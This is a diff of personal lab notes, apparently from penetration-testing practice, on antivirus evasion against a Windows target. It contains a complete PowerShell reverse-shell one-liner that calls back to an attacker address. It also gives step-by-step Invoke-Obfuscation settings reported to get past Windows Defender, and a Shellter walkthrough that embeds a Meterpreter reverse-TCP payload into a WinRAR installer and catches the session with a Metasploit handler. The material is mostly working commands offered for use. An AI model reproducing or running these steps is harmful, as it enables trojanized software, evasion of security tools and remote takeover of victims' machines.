@@ -4,6 +4,9 @@ Evasion Techniques
 linode - HS
 
 
+### Invoke-Obfuscation
+
+
 On kali (attacker VM)
 
   - pwsh                                                                                                #(powershell)
@@ -25,11 +28,11 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1'
 $client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 
 
- - Invoke-Obfuscation> SET SCRIPTPATH /home/kali/shell.ps1
+ - Invoke-Obfuscation> SET SCRIPTPATH /home/kali/shell.ps1                             #(TECHNIQUE 1)
  - Invoke-Obfuscation> ENCODING
  - Invoke-Obfuscation/Encoding> ENCODING 5 (or 2,3,4,6,7 ...)
  - Invoke-Obfuscation/Encoding> ENCODING 5
-       - BIJWGCIUGWIUVIUCVI@^*&%*&*(JCKBKJVBECY@GU89656747VJHV                         #(copy the all (long) result) in a note 'reverse-shell.ps1')   
+       - BIJWGCIUGWIUVIUCVI@^*&%*&*(JCKBKJVBECY@GU89656747VJHV                         #(copy the all (long) result in a note 'reverse-shell.ps1')   
        
        
  On kali (attacker VM)
@@ -41,14 +44,75 @@ $client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$stream = 
        - listening on [any] 1234 ...
        
   
-  On the Win (target VM)
+ On the Win (target VM)
   
    - Enable Win Defender
    - Launch reverse-shell.ps1                                                   #(quiet Win Defender but no reverse shell with ENCODING 5. Try w/2 or 3,4,5,6,7....)
    
    
    
+   - Invoke-Obfuscation> SET SCRIPTPATH /home/kali/shell.ps1                    #(TECHNIQUE 2 = powerful = AST mode)
+   - Invoke-Obfuscation/AST> ALL
+   - Invoke-Obfuscation/AST> 1
+   - Invoke-Obfuscation/AST>
+         - Ser.Variable.coiehciowev.4883746hfwngklw                             #(copy the result in a note 'obfuscated.ps1') 
    
+   
+On the Win (target VM)
+  
+   - Enable Win Defender
+   - Launch obfuscated.ps1                                                      #(quiet Win Defender and the reverse-shell works !)
+
+
+
+### SHELLTER
+
+https://www.shellterproject.com/
+
+
+On kali (attacker VM)
+
+ - cd /usr/share/windows-resources/shellter/
+ 
+ - Dowmload the original winrar.32.bits.exe                                       #(32 bits only works w/ shellter)
+ 
+ - sudo wine shellter.exe
+     - choose A (automatic mode)
+     - PE target > /home/kali/Downloads/winrar.32.bits.exe  
+     - Enable Stealth Mode > Y 
+     - PAYLOADS
+       [1] Meterpreter_Reverse_TCP
+       [2] Meterpreter_Reverse_HTTP
+       [3] Meterpreter_Reverse_HTTPS
+       [4] Meterpreter_Bind_TCP
+       [5] Shell_Reverse_TCP
+       [6] Shell_Bind_TCP
+       [7] WinExec 
+     - Use a listed payload or custom > L
+     - Select payload by index > 1
+     - Meterpreter_Reverse_TCP > SET LHOST: 10.10.10.10
+     - Meterpreter_Reverse_TCP > SET LPORT: 1234
+     - Save the payload on kali disk
+     
+     
+ - serve
+       - Serving HTTP on 0.0.0.0 prot 80 ...
+     
+     
+ - msfconsole
+       - msf6 > use multi/handler
+       - msf6 exploit (multi/handler) > set payload windows/meterpreter/reverse_tcp
+       - msf6 exploit (multi/handler) > set LHOST 10.10.10.10
+       - msf6 exploit (multi/handler) > set LPORT 1234
+       - msf6 exploit (multi/handler) > set AutoRunScript post/windows/manage/migrate
+       - msf6 exploit (multi/handler) > run
+            - starting reverse TCP handles on 10.10.10.10:1234 ... 
+            
+            
+ On the Win (target VM)
+   
+   - execute winrar.32.bits.exe 
+   - run anyway                                           #(reverse shell works via meterpreter)
    
    
        
